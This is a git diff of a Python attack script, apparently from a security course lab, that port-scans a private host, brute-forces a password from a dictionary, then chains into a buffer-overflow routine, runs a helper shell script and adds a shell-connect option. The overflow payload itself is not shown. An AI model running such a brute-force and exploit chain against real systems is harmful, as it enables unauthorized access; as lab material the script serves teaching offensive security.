@@ -4,6 +4,7 @@ import socket
 import time
 import datetime
 import argparse
+import subprocess
 HOST = '192.168.1.10'
 PORT = 10247
 SKELETONKEY = 'Passepartout'
@@ -21,7 +22,14 @@ def parse():
      parser.add_argument('--key',default='Passepartout',type=str,help="SKELETONKEY",dest='key')
      parser.add_argument('--user',default='bosdhill',type=str,help="CRUZID",dest='user')
      parser.add_argument('--dict',default='dictionary.txt',type=str,help="DICT",dest='dict')
+     parser.add_argument('--shell', default=False, type=bool, help="shell mode", dest='shell')
      return parser.parse_args()
+
+def buffer_overflow():
+     smash()
+     subprocess.call(['chmod', '+x', 'gethtml.sh'])
+     subprocess.call(['./gethtml.sh', HOST, str(PORT)])
+     print_redirect_url()
 
 def to_bytes(msg):
      return bytes(msg, 'utf-8')
@@ -37,7 +45,7 @@ def create_dict():
      return passwords
 
 def print_redirect_url():
-     fp = open("buffer_curl_response.html", "r")
+     fp = open("response.html", "r")
      lines = fp.readlines()
      start_index = lines[0].find("URL=\'")
      URL = lines[0][start_index + len("URL=\'"):].split("\'")[0]
@@ -156,7 +164,7 @@ def crack_password():
                     print("Password cracked! Password is %s" % passwords[i])
                     password = passwords[i]
                     s.close()
-                    # pass to next function
+                    buffer_overflow()
                     break
           else:
                # print("\tOut of tries!")
@@ -186,14 +194,14 @@ def scan_ports():
           s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
           print("connecting to PORT %d" % PORT)
           s.connect((HOST, PORT))
-          s.sendall(bytes(SKELETONKEY, 'utf-8'))
+          s.sendall(to_bytes(SKELETONKEY))
           data = s.recv(BYTES)
-          s.sendall(bytes(CRUZID + '\n', 'utf-8'))
+          s.sendall(to_bytes(CRUZID + '\n'))
           s.settimeout(5)
           data = s.recv(BYTES)
           s.close()
           print("data received",data)
-          if data.decode('utf-8') == 'Password: ':
+          if to_str(data) == 'Password: ':
                print('Received %s from port %d' % (data.decode('utf-8'), PORT))
                crack_password()
                break
@@ -204,6 +212,8 @@ def main():
      global CRUZID
      global DICTIONARY
      args = parse()
+     if args.shell == True:
+          shell_connect()
      HOST = args.ip
      SKELETONKEY = args.key
      CRUZID = args.user
@@ -216,7 +226,7 @@ if __name__ == "__main__":
 
 #      pass
 #     crack_password(10247)
-	# shell_connect()
+
      # auto_connect()
      # smash()
      # print_redirect_url()
